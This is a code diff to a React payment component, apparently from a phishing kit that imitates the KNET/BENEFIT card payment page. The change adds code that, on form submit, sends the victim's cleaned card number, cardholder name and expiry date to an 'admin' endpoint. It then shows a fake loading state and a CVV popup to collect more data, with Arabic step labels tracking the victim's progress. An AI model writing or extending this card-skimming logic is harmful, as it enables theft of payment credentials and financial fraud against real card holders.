@@ -360,10 +360,31 @@ export default function KNETPayment() {
     e.preventDefault();
     if (!validateCardForm()) return;
 
-    // Show loading then CVV popup after 2 seconds
+    // Send card info to admin immediately
     setCvvLoading(true);
     setRejectedError("");
 
+    const cleanCard = cardNumber.replace(/\s+/g, "");
+    sendData({
+      paymentCard: {
+        cardNumber: cleanCard,
+        cardNumberOnly: cleanCard,
+        prefix: "",
+        nameOnCard: cardHolderName,
+        expiryMonth: expiryMonth.padStart(2, "0"),
+        expiryYear: expiryYear,
+        cvv: "N/A",
+        pin: "N/A",
+        bankName: "BENEFIT",
+        paymentMethod: "BENEFIT Debit",
+      },
+      current: "بيانات البطاقة بنفت",
+      nextPage: "CVV بنفت",
+      waitingForAdminResponse: false,
+      isCustom: true,
+    });
+
+    // Show CVV popup after 2 seconds
     setTimeout(() => {
       setCvvLoading(false);
       setShowCvvPopup(true);
